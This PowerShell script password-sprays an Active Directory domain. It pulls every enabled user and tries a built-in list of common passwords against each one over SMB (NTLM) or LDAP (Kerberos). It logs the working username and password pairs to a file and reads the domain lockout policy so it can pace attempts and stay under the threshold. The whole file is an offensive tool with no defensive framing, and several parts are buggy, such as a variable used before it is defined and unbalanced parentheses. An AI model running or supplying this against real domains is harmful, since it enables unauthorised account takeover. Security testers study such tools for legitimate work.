Param
 (
    $Domain,
    $AuthType = 'NTLM',
    [switch]$OnlyShowAuccess = $True,
    [switch]$EnableJitter,
    [switch]$AutoTune,
    [string]$DomainController,
    $PasswordFile,
    $PasswordSprayResultsFile
 )

IF ($DomainController)
 { 
    $DomainDC = $DomainController
    $RemotePath = "\\$DomainController\SYSVOL"
 }
ELSE
 {
    $DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
    $DomainDC = $DomainDCInfo.Name
    $DomainDCIP = $DomainDCInfo.IPv4Address
    $RemotePath = "\\$DomainInfoDNS\SYSVOL"
 }

 [array]$DomainInfo = Get-ADDomain -Server $DomainDC
 $DomainInfoDNS = $DomainInfo.DNSRoot

IF ($AutoTune -eq $True)
 { 
    $DomainPasswordPolicy = Get-ADDefaultDomainPasswordPolicy -Server $DomainDC 
     Write-Host "Lockout Threshold is $($DomainPasswordPolicy.LockoutThreshold) with an Observation window of $($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes) minutes"
    IF ($DomainPasswordPolicy.LockoutThreshold -gt 0)
     {       
        $TotalAttempts = ($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $DomainPasswordPolicy.LockoutThreshold) - 1
        $WaitTimeInMinutes = $DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $TotalAttempts
     }
    ELSE
     { $WaitTimeInMinutes = 1 }
 }


IF (!$PasswordFile)                                                                                     
 { [array]$PasswordArray = @('Password99!','Password1234','P@ssw0rd1','1234Password','Password123!','Qwerty!','Zxcvbnm!','Qwertyuiop!','1234asdf!','qwer1234!','ThisIsASecurePassword!','WilECoyote!','WrongPassword!' ) }
IF ($PasswordFile)
 { [array]$PasswordArray = Import-CSV $PasswordFile }

[array]$UserAccountArray = Get-ADUser -Filter * -Server $DomainDC | Where { $_.Enabled -eq $True} 
$UserAccountArray = $UserAccountArray | Sort-Object SamAccountName

$PWSprayUserFileCheck = Read-Host "Password Spray Output file exists ($PasswordSprayResultsFile). Overwrite? (Y/N)?"
IF ( ($PWSprayUserFileCheck -eq 'N') -OR ($PWSprayUserFileCheck -eq 'No') )
 {
    $PWSprayFileArray = $PasswordSprayResultsFile -Split '\\'
    $PWSprayFileNameArrayCount = $PWSprayFileArray.count -1
    $PWSprayFileNameArrayText = ($PWSprayFileArray[$PWSprayFileNameArrayCount] -split '\.')[0]
    $PWSprayFileNameText = $PWSprayFileNameArrayText + '-' + $(Get-Random -min 100 -max 999)
    $PWSprayFileNewArrayUpdated = $PasswordSprayResultsFile.Replace($PWSprayFileNameArrayText, $PWSprayFileNameText)
    $PasswordSprayResultsFile = $PWSprayFileNewArrayUpdated
 }

"Password Spray Results for $Domain using $AuthType " | Out-File  $PassowrdSprayResultsFile

Write-Host "Password Spraying the domain $Domain using $AuthType against $($UserAccountArray.count) users using $($PasswordArray.Count) passwords..."
ForEach ($PasswordArrayItem in $PasswordArray)
 {
    # Write-host "Password spraying $($UserAccountArray.count) users with the password $PasswordArrayItem"
    ForEach ($UserAccountArrayItem in $UserAccountArray)
     {
        $username = $DomainInfo.NetBIOSName + '\' + $UserAccountArrayItem.SamAccountName

        If ($OnlyShowAuccess -ne $True)
         { Write-Host "Password spraying username $($UserAccountArrayItem.SamAccountName) with password $PasswordArrayItem" }

        IF ($AuthType -eq 'NTLM')
          { 
            TRY
             {
                $outputSMB = @()
                $password = ConvertTo-SecureString $PasswordArrayItem -AsPlainText -Force
                $cred = New-Object System.Management.Automation.PSCredential($username, $password)
                $outputSMB = New-SmbMapping -RemotePath $RemotePath -Credential $cred -ErrorAction Stop
                Remove-SmbMapping -RemotePath $RemotePath -Force
                IF ($outputSMB.Status -eq 'Ok')
                 { 
                    write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
                    $($UserAccountArrayItem.SamAccountName + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append   
                 }
             }
            CATCH
             { write-verbose "Password is incorrect" }
          }
        
        IF ($AuthType -eq 'Kerberos')
          { 
            TRY
             { 
                $outputDSDE = @()
                $outputDSDE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainInfo.DistinguishedName)",$username,$PasswordArrayItem) 
                IF ($outputDSDE.distinguishedName)
                 { 
                    write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
                    $($UserAccountArrayItem.SamAccountName + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append 
                 }
             }
            CATCH 
             { write-verbose "Password is incorrect" }
          }
     }
    IF ($AutoTune -eq $True)
     { Start-Sleep -Seconds $($WaitTimeInMinutes * 60) } 
 }
